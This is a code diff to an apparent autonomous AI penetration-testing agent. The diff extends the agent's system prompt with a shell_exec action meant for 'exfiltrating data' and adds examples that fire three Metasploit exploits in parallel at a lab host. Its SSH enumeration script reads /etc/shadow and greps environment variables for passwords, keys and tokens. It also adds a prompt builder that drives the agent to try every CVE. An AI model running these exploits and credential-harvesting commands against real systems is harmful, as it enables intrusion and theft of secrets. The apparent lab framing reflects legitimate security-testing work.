@@ -55,9 +55,10 @@ ATTACK PHASES (follow in order unless operator notes redirect you):
        *** NOT mean mission complete — continue until ALL unexecuted CVEs have been tried.
   5. POST_EXPLOIT    — MANDATORY after each successful exploit:
        a. INITIAL RECON — include post_commands in the exploit run call (preferred), or use action=session_exec if msfrpcd is available
-       b. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
-       c. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
-       d. ESCALATION     — attempt privilege escalation if not already root
+       b. DEEP ENUM     — shell_exec (action=exec_script) for multi-step enumeration (SUID, cron, shadow, env secrets)
+       c. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
+       d. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
+       e. FILE OPS      — shell_exec (action=upload/download) for transferring tools or exfiltrating data
   6. DONE            — generate_report ONLY after ALL CVEs have been attempted
 
 MODE BEHAVIOUR:
@@ -119,7 +120,7 @@ Respond with a single valid JSON object only. No prose, no markdown, no comments
   "reasoning": "<one sentence: why this action, why now>"
 }
 
-Available action values: nmap_scan, searchsploit_search, metasploit_run, ssh_exec, generate_report, parallel_tools
+Available action values: nmap_scan, searchsploit_search, metasploit_run, ssh_exec, shell_exec, generate_report, parallel_tools
 
 PARALLEL EXECUTION:
 When multiple tool calls are fully independent (e.g. searchsploit for 5 different services after a port scan),
@@ -263,6 +264,72 @@ Example 7 — Parallel exploit search for multiple services (best use of paralle
     {"action": "searchsploit_search", "parameters": {"service": "mysql", "version": "5.0.51"}}
   ],
   "reasoning": "5 independent exploit searches — parallel_tools saves 4 sequential iterations."
+}
+
+Example 8 — Parallel exploit execution for multiple independent CVEs
+{
+  "thought": "EXPLOITATION phase. Found 3 independent CVEs on different ports: vsftpd:21, samba:445, distccd:3632. All are remote RCE, all independent — running them in parallel cuts 2 iterations. post_commands included so recon runs in the same msfconsole invocation.",
+  "action": "parallel_tools",
+  "tools": [
+    {
+      "action": "metasploit_run",
+      "parameters": {
+        "action": "run",
+        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+        "target_ip": "192.168.1.5",
+        "target_port": 21,
+        "payload": "",
+        "post_commands": ["id && whoami && uname -a", "cat /etc/passwd"]
+      }
+    },
+    {
+      "action": "metasploit_run",
+      "parameters": {
+        "action": "run",
+        "module": "exploit/multi/samba/usermap_script",
+        "target_ip": "192.168.1.5",
+        "target_port": 445,
+        "payload": "",
+        "post_commands": ["id && whoami && hostname"]
+      }
+    },
+    {
+      "action": "metasploit_run",
+      "parameters": {
+        "action": "run",
+        "module": "exploit/unix/misc/distcc_exec",
+        "target_ip": "192.168.1.5",
+        "target_port": 3632,
+        "payload": "",
+        "post_commands": ["id && uname -a"]
+      }
+    }
+  ],
+  "reasoning": "3 independent RCE exploits on separate ports — parallel execution cuts 2 iterations."
+}
+
+Example 9 — shell_exec for deep post-exploitation enumeration
+{
+  "thought": "SSH credentials available (msfadmin/msfadmin). Using shell_exec with exec_script for comprehensive post-exploitation enumeration — SUID binaries, cron, network, sensitive files — in a single SSH session.",
+  "action": "shell_exec",
+  "parameters": {
+    "action": "exec_script",
+    "method": "ssh",
+    "target_ip": "192.168.1.5",
+    "target_port": 22,
+    "username": "msfadmin",
+    "password": "msfadmin",
+    "commands": [
+      "id && whoami && uname -a && hostname",
+      "sudo -l 2>/dev/null",
+      "find / -perm -4000 -type f 2>/dev/null | head -20",
+      "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null",
+      "cat /etc/shadow 2>/dev/null | head -10",
+      "netstat -tlnp 2>/dev/null || ss -tlnp",
+      "env 2>/dev/null | grep -iE 'pass|key|secret|token|api' | head -10"
+    ]
+  },
+  "reasoning": "Multi-step enumeration via SSH — single connection, all commands in sequence."
 }\
 """
 
@@ -527,6 +594,36 @@ class PromptBuilder:
             lines.append(
                 f"\nPENDING PORT SCANS: {', '.join(context.hosts_pending_port_scan[:5])}"
             )
+
+        # Show services still needing exploit search — agent MUST search all before exploitation
+        if context.attack_phase == "EXPLOIT_SEARCH" and context.hosts_pending_exploit_search:
+            pending_svcs = context.hosts_pending_exploit_search[:15]
+            lines.append(
+                f"\nPENDING EXPLOIT SEARCHES ({len(context.hosts_pending_exploit_search)} services remaining):"
+            )
+            lines.append("  Search using the PRODUCT NAME from the version string, not the protocol name.")
+            lines.append("  Format shown: port — protocol | version (use version's first word as 'service' param)")
+            for entry in pending_svcs:
+                parts = entry.split(":", 3)
+                if len(parts) >= 3:
+                    protocol = parts[2]
+                    ver_str = parts[3] if len(parts) > 3 else ""
+                    # Extract product name = first word of version string (e.g. "vsftpd" from "vsftpd 2.3.4")
+                    ver_words = ver_str.split()
+                    product = ver_words[0] if ver_words else protocol
+                    ver_num = " ".join(ver_words[1:]) if len(ver_words) > 1 else ""
+                    hint = f'→ search service="{product.lower()}" version="{ver_num}"' if ver_num else f'→ search service="{product.lower()}"'
+                    lines.append(f"  {parts[0]}:{parts[1]} {protocol} | {ver_str}  {hint}")
+                else:
+                    lines.append(f"  {entry}")
+            if len(context.hosts_pending_exploit_search) > 15:
+                lines.append(f"  ... and {len(context.hosts_pending_exploit_search)-15} more")
+            lines.append(
+                "  *** Use parallel_tools to search ALL pending services simultaneously. ***"
+                "\n  *** Do NOT advance to EXPLOITATION until this queue is empty.       ***"
+            )
+        elif context.attack_phase == "EXPLOIT_SEARCH" and not context.hosts_pending_exploit_search:
+            lines.append("\nALL SERVICES SEARCHED — may advance to EXPLOITATION.")
 
         return "\n".join(lines)
 
